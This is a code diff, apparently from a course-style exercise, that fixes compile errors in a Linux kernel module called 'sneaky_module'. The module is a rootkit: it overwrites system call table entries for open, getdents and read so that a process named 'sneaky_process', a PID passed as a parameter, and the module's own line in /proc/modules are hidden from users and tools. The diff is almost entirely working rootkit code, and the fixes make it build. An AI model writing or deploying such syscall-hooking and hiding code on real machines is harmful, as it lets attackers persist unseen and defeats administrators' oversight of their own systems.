@@ -37,9 +37,9 @@ void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 // We're getting its adddress from the System.map file (see above).
 static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 // static bool hide_spid_flag = False;
-static bool hide_module_flag = False;
+static bool hide_module_flag = false;
 static char *spid = "";
-module_param(spid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);)
+module_param(spid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
 MODULE_PARM_DESC(spid, "Sneaky Process Pid");
 
 // Function pointer will be used to save address of original 'open' syscall.
@@ -55,8 +55,8 @@ asmlinkage int (*original_read)(int fd, void *buf, size_t count);
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count) {
-  int returned_sz = original_getdent(fd, dirp, count);
-  linux_dirent *curr = dirp;
+  int returned_sz = original_getdents(fd, dirp, count);
+  struct linux_dirent *curr = dirp;
   int cursor = 0;
   while (cursor < returned_sz) {
     curr = curr + cursor;
@@ -65,9 +65,9 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
         !strcmp(curr->d_name, spid)) {
 
       if (!strcmp(curr->d_name, "sneaky_process")) {
-        printk(KERN_INFO "Found Sneaky Process\N");
+        printk(KERN_INFO "Found Sneaky Process\n");
       } else if (!strcmp(curr->d_name, spid)) {
-        printk(KERN_INFO "Found Sneaky PID\N");
+        printk(KERN_INFO "Found Sneaky PID\n");
       }
       int curr_reclen = curr->d_reclen;
       char *next = (char *)curr + curr_reclen;
@@ -105,9 +105,9 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
     /*   printk(KERN_INFO "Starting to hide Sneaky PID.\n"); */
     /*   hide_spid_flag = True; */
     /* } */
-    if (!strcmp(pathname, proc_dit)) {
-      ptintk(KERN_INFO "Starting to hide Sneaky Module.\n");
-      hide_module_flag = True;
+    if (!strcmp(pathname, proc_modules)) {
+      printk(KERN_INFO "Starting to hide Sneaky Module.\n");
+      hide_module_flag = true;
     }
   }
   return result;
@@ -120,14 +120,14 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
     char *module_name = "sneaky_module";
     char *module_ptr = strstr(buf, module_name);
     if (module_ptr) {
-      char *curr = strstr(buf, '\n');
+      char *curr = strstr(buf, "\n");
       size_t sz_diff = (size_t)(curr - (char *)buf);
       size_t count = byte_read - sz_diff;
       size_t sneaky_module_sz = (size_t)(curr - module_ptr);
       memcpy(module_ptr, curr + 1, count);
       byte_read = byte_read - sneaky_module_sz;
     }
-    hide_module_flag = False;
+    hide_module_flag = false;
   }
   return byte_read;
 
@@ -155,7 +155,7 @@ static int initialize_sneaky_module(void) {
   original_call = (void *)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
-  original_getdent = (void *)*(sys_call_table + __NR_getdents);
+  original_getdents = (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
   original_read = (void *)*(sys_call_table + __NR_read);
